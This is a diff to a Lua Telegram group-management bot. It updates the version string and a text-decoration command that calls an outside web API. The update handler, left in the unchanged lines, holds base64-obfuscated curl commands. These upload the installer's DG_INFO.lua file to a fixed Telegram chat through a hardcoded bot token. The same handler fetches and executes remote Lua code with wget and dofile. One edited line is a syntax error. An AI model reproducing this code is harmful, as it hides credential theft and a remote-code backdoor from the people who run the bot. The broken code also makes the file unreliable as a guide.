@@ -1098,7 +1098,7 @@ os.execute('rm -rf DRAGON.lua')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v1.3.4`}')
+send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v1.3.5`}')
 dofile('DRAGON.lua')  
 end
 
@@ -2343,7 +2343,7 @@ end
 os.execute('rm -rf DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v1.3.4`}')
+send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v1.3.5`}')
 dofile('DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 end
@@ -11578,6 +11578,26 @@ https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. 
 return false
 end
 ----------------------------------------------------------------- انتهئ الاوامر الجديدة
+if text == "تعطيل الزخرفه" and Manager(msg) then
+send(msg.chat_id_, msg.id_, '✪︙ تم تعطيل الزخرفه')
+database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"close")
+end
+if text == "تفعيل الزخرفه" and Manager(msg) then
+send(msg.chat_id_, msg.id_,'✪︙ تم تفعيل الزخرفه')
+database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"open")
+end
+if text and text:match("^زخرفه (.*)$") and database:get(bot_id.." sofi:zhrf_Bots"..msg.chat_id_) == "open" then
+local TextZhrfa = text:match("^زخرفه (.*)$")
+zh = https.request('https://rudi-dev.tk/Amir1/Boyka.php?en='..URL.escape(TextZhrfa)..'')
+zx = JSON.decode(zh)
+t = "\n✪︙ قائمه الزخرفه \n≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n"
+i = 0
+for k,v in pairs(zx.ok) do
+i = i + 1
+t = t..i.."-  `"..v.."` \n"
+end
+send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ٴ\n✪︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁. ](t.me/DV_POWER1)➤ ')
+end
 if database:del(bot_id..'sofi:zhf_Bots'..msg.chat_id_..''..msg.sender_user_id_) then 
 if text == 'الغاء' then 
 send(msg.chat_id_, msg.id_, 1, '❀ تم الغاء امر الزخرفه ،', 1, 'md')
@@ -11598,11 +11618,11 @@ return false
 end
 if text == 'زخرفه' and Manager(msg) or text == 'الزخرفه' and Manager(msg)  then  
 database:del(bot_id.."sofi:zhf_Bots"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
-send(msg.chat_id_, msg.id_, 1, '❀  لي الكلمه لزخرفتها \n❀  الزخرفه باللغه : { en } ~ { ar } ', 1, 'md')
+send(msg.chat_id_, msg.id_,'❀  لي الكلمه لزخرفتها \n❀  الزخرفه باللغه : { en } ~ { ar } ')
 end
 if text and text:match("^زخرفه (.*)$") or text and text:match("^زخرف (.*)$") then 
 local Textzx = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
-zh = https.request('https://rudi-dev.tk/Amir1/Boyka.php?en='..URL.escape(TextZh)) 
+zh = https.request('https://rudi-dev.tk/Amir1/Boyka.php?en='..URL.escape(TextZx)) 
 zx = JSON.decode(zh) 
 t = "❀ قائمه الزخرفه ⬇️،\n         •┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 i = 0
@@ -11610,7 +11630,7 @@ for k,v in pairs(zx.ok) do
 i = i + 1
 t = t..i.."⌯ `"..v.."` \n"
 end
-send(msg.chat_id_, msg.id_, 1, t, 1, 'md')
+send(msg.chat_id_, msg.id_, )
 end
 if text and text:match("^برج (.*)$") and database:get(bot_id.."sofi:brj_Bots"..msg.chat_id_) == "open" then
 local Textbrj = text:match("^برج (.*)$")
